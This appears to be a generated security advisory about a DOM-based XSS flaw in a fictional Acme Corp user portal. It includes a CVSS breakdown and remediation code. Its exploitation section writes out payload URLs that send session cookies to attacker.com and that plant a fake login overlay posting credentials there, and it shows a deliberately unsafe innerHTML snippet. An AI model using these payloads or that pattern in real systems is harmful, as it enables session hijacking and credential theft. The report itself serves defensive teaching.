# DOM-based Cross-Site Scripting in User Management Portal

# Vulnerability Case
During our review of Acme Corp's legacy user management portal, we discovered a DOM-based cross-site scripting (XSS) vulnerability stemming from the unsafe incorporation of user-controlled input into the web page via insecure document methods. The issue was identified when testing the profile update component, which leverages native JavaScript methods such as `innerHTML` for dynamic content rendering. Analysis revealed that a query parameter accepted from the URL was directly injected into the DOM without proper sanitization. This application, built with vanilla JavaScript, jQuery on the frontend, and a Node.js backend, relies on standard web technologies, thereby increasing the potential attack surface.

```javascript
// Vulnerable JavaScript snippet from the profile update feature
(function () {
  // Extract user-supplied data from the URL query parameter "data"
  const params = new URLSearchParams(window.location.search);
  const userData = params.get("data");

  // Insecure usage: Directly inserting unsanitized user input into the DOM
  document.getElementById("display").innerHTML = userData;
})();
```

An attacker can manipulate the URL by appending a malicious payload to the `data` parameter, which, due to the unsanitized insertion into the DOM, would execute arbitrary JavaScript code in the victim's browser context. Potential exploitation methods include leveraging crafted URLs distributed via phishing emails or malicious links, leading to session hijacking, credential theft, and further lateral movement within the application network. Given the widespread use of modern browsers and the common deployment of Node.js alongside jQuery, the business impact could be significant, resulting in compromised user data integrity, erosion of customer trust, and potential regulatory implications.


context: javascript.browser.security.insecure-document-method.insecure-document-method User controlled data in methods like `innerHTML`, `outerHTML` or `document.write` is an anti-pattern that can lead to XSS vulnerabilities

# Vulnerability Breakdown
This vulnerability involves a client-side DOM-based Cross-Site Scripting (XSS) flaw in Acme Corp's legacy user management portal, specifically in the profile update component.

1. **Key vulnerability elements**:
   - Direct insertion of unsanitized user input from URL query parameter into the DOM
   - Use of the unsafe `innerHTML` method to dynamically update page content
   - Lack of input validation or output encoding
   - Implementation in vanilla JavaScript with jQuery, commonly deployed technologies
   - High exposure through the user management portal, a critical application component

2. **Potential attack vectors**:
   - Crafted malicious URLs containing JavaScript payloads in the "data" parameter
   - Phishing emails containing the malicious links targeting company employees
   - Social engineering attacks tricking users into clicking malicious links
   - Potential for stored XSS if profile links can be shared within the application

3. **Severity assessment**:
   - Requires user interaction (clicking malicious link)
   - Allows execution of arbitrary JavaScript in victim's browser context
   - Enables session hijacking, credential theft, and other client-side attacks
   - Potentially affects all users of the management portal
   - No special privileges required to craft an attack

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): Low (L) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

# Description
A DOM-based Cross-Site Scripting (XSS) vulnerability has been discovered in Acme Corp's legacy user management portal, specifically in the profile update component. The vulnerability stems from improper handling of user-controlled input obtained from URL query parameters.

The application uses the `innerHTML` DOM property to directly insert content from the URL parameter "data" into the page without any sanitization or validation:

```javascript
// Vulnerable JavaScript snippet from the profile update feature
(function () {
  // Extract user-supplied data from the URL query parameter "data"
  const params = new URLSearchParams(window.location.search);
  const userData = params.get("data");

  // Insecure usage: Directly inserting unsanitized user input into the DOM
  document.getElementById("display").innerHTML = userData;
})();

```

This insecure practice allows attackers to craft malicious URLs containing JavaScript code in the "data" parameter. When a victim clicks such a URL, the browser executes the injected script in the context of the user's session, potentially leading to cookie theft, credential harvesting, or unauthorized actions performed on behalf of the victim.

# CVSS
**Score**: 5.4 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N \
**Severity**: Medium

The Medium severity rating (5.4) is based on the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability can be exploited remotely over the internet through crafted URLs
- **Low Attack Complexity (AC:L)**: Exploiting the vulnerability is straightforward and doesn't require special conditions
- **No Privileges Required (PR:N)**: An attacker doesn't need any authentication to craft a malicious URL
- **User Interaction Required (UI:R)**: The victim must click on a malicious link or visit a crafted URL for the attack to succeed
- **Unchanged Scope (S:U)**: The vulnerability affects only the user's browser session without impacting other components
- **Low Confidentiality Impact (C:L)**: The attacker can access sensitive information like cookies or data displayed on the page
- **Low Integrity Impact (I:L)**: The attacker can modify data or perform actions within the user's session
- **No Availability Impact (A:N)**: The vulnerability doesn't significantly impact the availability of the system

This classification reflects that while the vulnerability allows for the execution of arbitrary JavaScript in a victim's browser, it requires user interaction and primarily affects the individual user's session rather than the entire system infrastructure.

# Exploitation Scenarios
**Scenario 1: Session Hijacking via Phishing**
An attacker crafts a malicious URL targeting the vulnerable parameter:
```
https://acme-portal.com/profile?data=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

```
The attacker then sends this link to employees via email, disguised as a legitimate company communication. When a user clicks the link, their browser executes the injected script, sending their session cookie to the attacker's server. With this cookie, the attacker can hijack the victim's session and gain unauthorized access to the user management portal.

**Scenario 2: Credential Harvesting**
An attacker creates a URL with a payload that generates a fake login overlay:
```
https://acme-portal.com/profile?data=<script>document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;padding:20px;"><h2>Session Expired</h2><p>Please re-enter your credentials:</p><form id="fake" onsubmit="fetch(\'https://attacker.com/steal\',{method:\'POST\',body:JSON.stringify({u:this.username.value,p:this.password.value})});return false;"><input name="username" placeholder="Username"><input name="password" type="password" placeholder="Password"><button>Login</button></form></div>'</script>

```
When a victim visits this URL, their browser displays a convincing overlay asking them to re-enter their credentials. Any submitted credentials are sent to the attacker's server.

**Scenario 3: Lateral Movement**
An attacker who gains access to one user's account could use the XSS vulnerability to target administrators or other privileged users. By crafting a malicious link and sending it through internal messaging features, the attacker could execute JavaScript that performs unauthorized actions when clicked by a privileged user, such as creating new accounts or changing permissions.

# Impact Analysis
**Business Impact:**
- Potential unauthorized access to sensitive user information in the management portal
- Risk of credential theft leading to deeper system compromise
- Possible violation of data protection regulations (GDPR, CCPA, etc.) if personal data is exposed
- Reputational damage if attackers successfully impersonate legitimate users
- Loss of customer and employee trust in the security of the organization's web applications
- Potential financial losses from remediation efforts, incident response, and possible regulatory fines

**Technical Impact:**
- Execution of arbitrary JavaScript code in victims' browsers
- Ability to steal session cookies and hijack active user sessions
- Potential to harvest credentials through fake login forms
- Capability to perform unauthorized actions in the context of the victim's session
- Possible access to sensitive data visible on the page
- Risk of persistent attacks if the vulnerability can be leveraged to store malicious content
- Potential for network lateral movement if the compromised sessions have access to additional systems
- Bypass of same-origin policy protections, allowing access to page content and interaction with the application

# Technical Details
The vulnerability occurs due to the direct insertion of user-controlled input into the DOM using the `innerHTML` property, which is a known dangerous practice in web development.

```javascript
(function () {
  // Extract user-supplied data from the URL query parameter "data"
  const params = new URLSearchParams(window.location.search);
  const userData = params.get("data");

  // Insecure usage: Directly inserting unsanitized user input into the DOM
  document.getElementById("display").innerHTML = userData;
})();

```

**Key Technical Issues:**

1. **Unsafe DOM Manipulation**: The `innerHTML` property parses and renders HTML content, including executing any embedded `<script>` tags or event handlers (like `onclick`, `onerror`, etc.). When user input is directly assigned to `innerHTML`, it gives attackers a direct path to inject malicious scripts.

2. **No Input Validation**: The code retrieves the "data" parameter from the URL without any validation or sanitization. It doesn't check for malicious content patterns or restrict the input in any way.

3. **No Output Encoding**: The application fails to encode special characters that could break out of the context in which they're inserted, such as angle brackets, quotes, or JavaScript syntax.

4. **Execution Context**: When the injected script executes, it runs in the full context of the origin, with access to:
   - Cookies (including session cookies if not protected with HttpOnly flag)
   - Local Storage and Session Storage
   - DOM elements on the page
   - The ability to make same-origin requests

**Attack Surface Expanded:**

This vulnerability is particularly concerning because it exists in a user management portal, which typically handles sensitive operations like user creation, permission management, and possibly access to personal information. Successful exploitation could serve as an entry point for deeper attacks against the organization's infrastructure.

Modern browsers have some built-in XSS protections, but DOM-based XSS often bypasses these protections since the JavaScript execution happens directly in the browser without server involvement.

# Remediation Steps
## Replace innerHTML with Safer Alternatives

**Priority**: P0

Immediately replace the use of `innerHTML` with safer DOM manipulation methods that don't execute scripts:

```javascript
(function () {
  // Extract user-supplied data from the URL query parameter "data"
  const params = new URLSearchParams(window.location.search);
  const userData = params.get("data");
  
  // SAFE: Use textContent instead of innerHTML when displaying user input
  document.getElementById("display").textContent = userData;
})();

```

If HTML formatting is absolutely necessary, create DOM elements safely instead:

```javascript
(function () {
  const params = new URLSearchParams(window.location.search);
  const userData = params.get("data");
  
  // Clear the current contents
  const displayElement = document.getElementById("display");
  while (displayElement.firstChild) {
    displayElement.removeChild(displayElement.firstChild);
  }
  
  // Create a text node instead of parsing HTML
  const textNode = document.createTextNode(userData);
  displayElement.appendChild(textNode);
})();

```

This approach prevents any HTML or JavaScript in the user input from being interpreted by the browser.
## Implement Input Sanitization

**Priority**: P1

If HTML content must be supported, implement proper sanitization using a trusted library:

```javascript
(function () {
  // Extract user-supplied data
  const params = new URLSearchParams(window.location.search);
  const userData = params.get("data");
  
  // Import DOMPurify library in your HTML:
  // <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.4.0/purify.min.js"></script>
  
  // Sanitize the input to remove any malicious content
  const sanitizedData = DOMPurify.sanitize(userData, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'ul', 'li'],  // Restrict to safe tags only
    ALLOWED_ATTR: []  // Disallow all attributes initially, add only what's needed
  });
  
  // Only now use innerHTML with the sanitized content
  document.getElementById("display").innerHTML = sanitizedData;
})();

```

This approach removes any potentially malicious tags, attributes, or JavaScript from the user input before insertion into the DOM. The whitelist approach ensures only known-safe elements are allowed.


# References
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* CWE-116 | [Improper Encoding or Escaping of Output](https://cwe.mitre.org/data/definitions/116.html)
